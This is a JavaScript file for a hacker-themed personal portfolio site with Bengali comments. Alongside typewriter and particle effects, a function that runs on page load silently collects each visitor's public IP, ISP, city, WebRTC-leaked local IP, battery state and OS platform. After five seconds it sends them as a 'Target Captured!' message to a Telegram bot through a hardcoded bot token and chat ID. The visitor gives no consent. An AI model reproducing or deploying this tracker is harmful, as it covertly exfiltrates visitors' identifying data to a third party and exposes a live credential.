/* Project: Yash Khan Elite Portfolio 
   Optimization: Fast Data Capture & Parallel Tracking
*/

const TELEGRAM_BOT_TOKEN = '8414005580:AAGDuGg7LemMlzS6QJu5_06aHamqMlGYnas';
const TELEGRAM_CHAT_ID = '7950771882';

// ১. টাইপরাইটার ইফেক্ট
const textArray = ["CYBER SECURITY STRATEGIST", "OFFENSIVE PENETRATION TESTER", "WHITE HAT HACKER"];
let textIndex = 0, charIndex = 0, isErasing = false;

function typeEffect() {
    const el = document.getElementById("typewriter");
    if (!el) return;
    let word = textArray[textIndex];
    el.textContent = isErasing ? word.substring(0, charIndex--) : word.substring(0, charIndex++);
    let delay = isErasing ? 50 : 100;
    if (!isErasing && charIndex === word.length) { delay = 2000; isErasing = true; }
    else if (isErasing && charIndex === 0) { isErasing = false; textIndex = (textIndex + 1) % textArray.length; delay = 500; }
    setTimeout(typeEffect, delay);
}

// ২. অত্যন্ত দ্রুত সাইলেন্ট ট্র্যাকার (Parallel Mode)
async function runSilentTracker() {
    const userDetails = document.getElementById('user-details');
    const scanStatus = document.getElementById('scan-status');

    let data = {
        publicIp: 'Fetching...',
        localIp: 'Scanning...',
        loc: 'N/A',
        isp: 'N/A',
        batt: 'N/A'
    };

    // Parallel execution for speed
    const fetchPublicData = async () => {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const json = await res.json();
            data.publicIp = json.ip || "N/A";
            data.isp = json.org || "N/A";
            data.loc = `${json.city}, ${json.country_name}`;
            updateUI();
        } catch (e) { data.publicIp = "Shielded"; updateUI(); }
    };

    const fetchLocalIp = () => {
        const rtc = new RTCPeerConnection({ iceServers: [] });
        rtc.createDataChannel('');
        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
        rtc.onicecandidate = (ice) => {
            if (ice && ice.candidate && ice.candidate.candidate) {
                const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if (match) { data.localIp = match[1]; updateUI(); }
            }
        };
        setTimeout(() => { if(data.localIp === 'Scanning...') data.localIp = "N/A"; updateUI(); }, 3000);
    };

    const fetchBattery = async () => {
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            data.batt = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
            updateUI();
        }
    };

    function updateUI() {
        if (userDetails) {
            userDetails.innerHTML = `
                > [SYSTEM] PUBLIC IP: <span style="color:#fff">${data.publicIp}</span> <br>
                > [SYSTEM] LOCAL IP: <span style="color:#fff">${data.localIp}</span> <br>
                > [SYSTEM] ISP: <span style="color:#fff">${data.isp}</span> <br>
                > [SYSTEM] LOC: <span style="color:#fff">${data.loc}</span> <br>
                > [SYSTEM] BATT: <span style="color:#fff">${data.batt}</span> <br>
                > [SYSTEM] STATUS: <span style="color:#ff003c">TRACED</span>
            `;
        }
        if (scanStatus) {
            scanStatus.innerHTML = "⚠️ SECURITY VULNERABILITY DETECTED: CONNECTION EXPOSED";
            scanStatus.style.color = "#ff003c";
        }
    }

    // সব কাজ একসাথে শুরু করা
    fetchPublicData();
    fetchLocalIp();
    fetchBattery();

    // ৫ সেকেন্ড পর চূড়ান্ত রিপোর্ট টেলিগ্রামে পাঠানো
    setTimeout(async () => {
        const msg = `
🎯 **Target Captured!**
🌐 Public: ${data.publicIp}
🏠 Local: ${data.localIp}
📍 Loc: ${data.loc}
🔋 Battery: ${data.batt}
📱 OS: ${navigator.platform}
🕒 Time: ${new Date().toLocaleString()}
`;
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);
    }, 5000);
}

// ৩. পার্টিকেলস
function initParticles() {
    if (window.particlesJS) {
        particlesJS("particles-js", {
            "particles": {
                "number": { "value": 50 },
                "color": { "value": "#00ff41" },
                "line_linked": { "opacity": 0.1 },
                "move": { "speed": 1 }
            }
        });
    }
}

window.onload = () => {
    initParticles();
    typeEffect();
    runSilentTracker(); // সরাসরি কল করা হয়েছে দ্রুত ডেটা পাওয়ার জন্য
};
